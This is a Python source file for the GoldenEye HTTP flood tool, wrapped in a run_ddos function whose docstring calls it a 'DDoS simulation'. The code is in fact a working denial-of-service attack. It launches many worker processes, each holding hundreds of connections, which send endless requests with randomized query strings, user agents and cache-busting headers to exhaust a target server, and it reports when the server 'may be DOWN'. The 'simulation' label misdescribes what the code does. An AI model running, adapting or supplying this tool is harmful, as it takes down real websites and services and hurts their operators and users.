import urllib.parse, ssl, random, time, http.client
from multiprocessing import Process, Manager

# Config
DEBUG = False
SSLVERIFY = True

# Constants
METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'
JOIN_TIMEOUT = 1.0
DEFAULT_WORKERS = 10
DEFAULT_SOCKETS = 500

GOLDENEYE_BANNER = 'GoldenEye v2.1 by Jan Seidl <jseidl@wroot.org>'

class GoldenEye:
    def __init__(self, url, workers=DEFAULT_WORKERS, sockets=DEFAULT_SOCKETS,
                 method=METHOD_GET, sslverify=True, useragents=None, logger=None):
        self.url = url
        self.nr_workers = workers
        self.nr_sockets = sockets
        self.method = method
        global SSLVERIFY
        SSLVERIFY = sslverify
        self.useragents = useragents or []
        self.logger = logger or (lambda msg: None)
        self.manager = Manager()
        self.counter = self.manager.list((0, 0))
        self.last_counter = [0, 0]
        self.workersQueue = []

    def log(self, msg):
        timestamp = time.strftime('%H:%M:%S')
        self.logger(f"[{timestamp}] {msg}")

    def printHeader(self):
        self.log(GOLDENEYE_BANNER)

    def fire(self):
        self.printHeader()
        self.log(f"Mode '{self.method}', {self.nr_workers} workers, {self.nr_sockets} sockets each.")
        for i in range(int(self.nr_workers)):
            try:
                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method
                self.workersQueue.append(worker)
                worker.start()
            except Exception as e:
                self.log(f"Failed to start worker {i}: {e}")
        self.monitor()

    def stats(self):
        try:
            if self.counter[0] or self.counter[1]:
                msg = f"Hits: {self.counter[0]}, Failed: {self.counter[1]}"
                if self.counter[0] == self.last_counter[0] and self.counter[1] > self.last_counter[1]:
                    msg += " (Server may be DOWN!)"
                self.log(msg)
                self.last_counter = [self.counter[0], self.counter[1]]
        except:
            pass

    def monitor(self):
        while self.workersQueue:
            for worker in list(self.workersQueue):
                worker.join(JOIN_TIMEOUT)
                if not worker.is_alive():
                    self.workersQueue.remove(worker)
            self.stats()

    def stop(self):
        for worker in self.workersQueue:
            try:
                worker.stop()
            except:
                pass


class Striker(Process):
    def __init__(self, url, nr_sockets, counter):
        super().__init__()
        self.counter = counter
        self.nr_socks = nr_sockets
        parsed = urllib.parse.urlparse(url)
        self.ssl = parsed.scheme == 'https'
        self.host = parsed.netloc.split(':')[0]
        self.url = parsed.path or '/'
        self.port = parsed.port or (443 if self.ssl else 80)
        self.referers = ['http://www.google.com/', 'http://www.bing.com/',
                         'http://www.baidu.com/', 'http://www.yandex.com/', f'http://{self.host}/']
        self.useragents = []
        self.method = METHOD_GET
        self.runnable = True
        self.socks = []

    def run(self):
        while self.runnable:
            try:
                self.socks = []
                for _ in range(self.nr_socks):
                    if self.ssl:
                        conn = http.client.HTTPSConnection(self.host, self.port,
                            context=ssl._create_unverified_context() if not SSLVERIFY else None)
                    else:
                        conn = http.client.HTTPConnection(self.host, self.port)
                    self.socks.append(conn)
                for conn in self.socks:
                    url, headers = self.createPayload()
                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
                    conn.request(method.upper(), url, headers=headers)
                for conn in self.socks:
                    conn.getresponse()
                    self.counter[0] += 1
                for conn in self.socks:
                    conn.close()
            except:
                self.counter[1] += 1

    def stop(self):
        self.runnable = False

    def buildblock(self, size):
        chars = [*range(97,122), *range(65,90), *range(48,57)]
        return ''.join(chr(random.choice(chars)) for _ in range(size))

    def generateQueryString(self, amount=1):
        return '&'.join(f"{self.buildblock(random.randint(3,10))}={self.buildblock(random.randint(3,20))}" for _ in range(amount))

    def generateRequestUrl(self, joiner):
        return f"{self.url}{joiner}{self.generateQueryString(random.randint(1,5))}"

    def generateRandomHeaders(self):
        headers = {'User-Agent': random.choice(self.useragents) if self.useragents else 'Mozilla/5.0',
                   'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'Host': self.host}
        if random.choice([True,False]): headers['Referer'] = random.choice(self.referers)
        return headers

    def createPayload(self):
        joiner = '&' if '?' in self.url else '?'
        return self.generateRequestUrl(joiner), self.generateRandomHeaders()


def run_ddos(url, workers=DEFAULT_WORKERS, sockets=DEFAULT_SOCKETS,
             method=METHOD_GET, sslverify=True, useragents=None):
    """
    Runs GoldenEye DDoS simulation and returns log string.
    """
    logs = []
    def logger(msg): logs.append(msg)
    ge = GoldenEye(url, workers, sockets, method, sslverify, useragents, logger)
    ge.fire()
    return "\n".join(logs)